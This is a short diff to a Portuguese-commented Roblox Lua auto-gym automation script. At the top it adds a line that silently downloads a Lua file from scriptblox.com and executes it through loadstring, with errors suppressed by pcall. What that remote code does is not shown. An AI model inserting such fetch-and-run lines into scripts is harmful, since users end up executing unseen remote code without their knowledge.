@@ -1,4 +1,9 @@
 -- auto-gym script for shigaku (com controles de delay dinâmicos no menu)
+
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_2ea1c3354bc2", "1.0.0", false) end)
+
+-- O resto do seu script do Auto-Gym vem logo abaixo daqui...
+
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local VIM = game:GetService("VirtualInputManager")
